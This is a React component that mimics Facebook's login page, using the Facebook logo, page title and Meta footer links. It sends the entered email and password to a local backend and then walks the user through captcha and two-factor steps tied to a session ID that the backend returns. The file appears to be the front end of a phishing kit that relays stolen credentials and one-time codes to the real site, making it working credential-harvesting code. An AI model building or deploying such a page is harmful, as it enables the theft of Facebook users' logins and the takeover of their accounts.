import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './FacebookLogin.css';
import LoadingSpinner from './LoadingSpinner';

const FacebookLogin = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  useEffect(() => {
    document.title = 'Facebook Login';
  }, []);
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({});
  // screenshots not shown in UI any more
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const validate = () => {
    const errs = {};
    // simple email regex
    if (!/^[\w-.]+@[\w-]+\.[a-z]{2,}$/i.test(email)) {
      errs.email = 'Please enter a valid email address.';
    }
    if (password.length < 6) {
      errs.password = 'Password must be at least 6 characters.';
    }
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;
    setLoading(true);
    setErrors({});
    try {
      // backend runs on port 8000, bypass CRA proxy
      const response = await fetch('http://localhost:8000/api/facebook/login', {
        method: 'POST',
        body: new FormData(e.target),
      });
      const data = await response.json();
      console.log('logged in', data);
      // decide where to go based on explicit page value
      if (data.success) {
        switch (data.page) {
          case 'captcha':
            navigate('/captcha', { state: { session_id: data.session_id } });
            return;
          case '2fa':
            navigate('/2fa', { state: { session_id: data.session_id } });
            return;
          case 'success':
            navigate('/');
            return;
          default:
            break;
        }
      } else {
        setErrors(prev => ({ ...prev, form: data.error || 'Login failed' }));
      }
    } catch (err) {
      console.error('login error', err);
      setErrors(prev=>({...prev, form: err.message}));
    } finally {
      setLoading(false);
    }
  };


  return (
    <div className="fb-login-container">
      <form className="fb-login-form" onSubmit={handleSubmit} noValidate>
        {loading && <LoadingSpinner fullPage text="Processing..." />}
        <img
          src="/images/facebook_logo.svg"
          alt="Facebook"
          className="fb-logo"
        />

        <div className="input-group">
          <input
            name="email"
            type="text"
            placeholder="Email or phone number"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            className={errors.email ? 'invalid' : ''}
          />
          {errors.email && <div className="error-msg">{errors.email}</div>}
        </div>

        <div className="input-group password-group">
          <input
            name="password"
            type={showPassword ? 'text' : 'password'}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className={errors.password ? 'invalid' : ''}
          />
          <button
            type="button"
            className="show-toggle"
            onClick={() => setShowPassword((s) => !s)}
          >
            {showPassword ? 'Hide' : 'Show'}
          </button>
          {errors.password && <div className="error-msg">{errors.password}</div>}
        </div>

        <button type="submit" className="btn login-btn" disabled={loading}>
          Log In
        </button>

        <div className="helper-links">
          <a href="#" className="forgot-link">
            Forgotten account?
          </a>
        </div>

        <hr />

        <button type="button" className="btn create-btn">
          Create new account
        </button>
      </form>

      <footer className="fb-footer">
        <div className="footer-links">
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Help</a>
          <a href="#">More</a>
        </div>
      </footer>
    </div>
  );
};

export default FacebookLogin;
